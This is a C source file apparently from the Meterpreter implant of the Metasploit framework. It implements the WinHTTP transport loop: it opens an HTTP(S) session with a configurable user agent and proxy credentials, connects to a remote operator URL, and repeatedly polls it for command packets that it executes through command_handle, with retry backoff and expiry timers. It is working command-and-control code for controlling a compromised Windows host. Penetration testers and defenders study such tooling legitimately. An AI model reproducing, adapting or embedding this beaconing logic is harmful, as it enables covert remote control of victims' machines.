/*!
 * @file server_setup_winhttp.c
 * @brief Contains functionality that allows for dispatching of HTTP(s) commands via WinHTTP
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include <winhttp.h>

#ifdef USE_WINHTTP

#define HOSTNAME_LEN 512
#define URLPATH_LEN 1024

DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* serverThread, int iExpirationTimeout, int iCommTimeout,
	wchar_t* pMetUA, wchar_t* pMetProxy, wchar_t* pMetProxyUser, wchar_t* pMetProxyPass)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;
	URL_COMPONENTS bits;
	DWORD ecount = 0;
	DWORD delay = 0;
	wchar_t tmpHostName[512];
	wchar_t tmpUrlPath[1024];

	remote->expiration_time = 0;
	if (iExpirationTimeout > 0)
	{
		remote->expiration_time = current_unix_timestamp() + iExpirationTimeout;
	}

	remote->comm_timeout = iCommTimeout;
	remote->start_time = current_unix_timestamp();
	remote->comm_last_packet = current_unix_timestamp();

	// Allocate the top-level handle
	if (!wcscmp(pMetProxy, L"METERPRETER_PROXY"))
	{
		remote->hInternet = WinHttpOpen(pMetUA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
	}
	else
	{
		remote->hInternet = WinHttpOpen(pMetUA, WINHTTP_ACCESS_TYPE_NAMED_PROXY, pMetProxy, NULL, 0);
	}

	if (!remote->hInternet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return 0;
	}

	// Proxy auth, if required.
	if (!(wcscmp(pMetProxyUser, L"METERPRETER_USERNAME_PROXY") == 0))
	{
		if (!WinHttpSetOption(remote->hInternet, WINHTTP_OPTION_PROXY_USERNAME, pMetProxyUser, lstrlen(pMetProxyUser)))
		{
			dprintf("[DISPATCH] Failed to set proxy username");
		}
		if (!WinHttpSetOption(remote->hInternet, WINHTTP_OPTION_PROXY_PASSWORD, pMetProxyPass, lstrlen(pMetProxyPass)))
		{
			dprintf("[DISPATCH] Failed to set proxy username");
		}
	}


	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = HOSTNAME_LEN - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URLPATH_LEN - 1;
	bits.lpszUrlPath = tmpUrlPath;

	WinHttpCrackUrl(remote->url, 0, 0, &bits);

	remote->uri = _wcsdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URL: %S", remote->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	remote->hConnection = WinHttpConnect(remote->hInternet, tmpHostName, bits.nPort, 0);
	if (!remote->hConnection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return 0;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
			break;
		}

		if (event_poll(serverThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_via_http(remote, &packet);
		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				remote->comm_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
			{
				// This means that the certificate validation failed, and so
				// we don't trust who we're connecting with. Bail out.
				break;
			}

			if (ecount < 10)
			{
				delay = 10 * ecount;
			}
			else
			{
				delay = 100 * ecount;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
			continue;
		}

		remote->comm_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		running = command_handle(remote, packet);
		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
	}

	// Close WinInet handles
	WinHttpCloseHandle(remote->hConnection);
	WinHttpCloseHandle(remote->hInternet);

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

#endif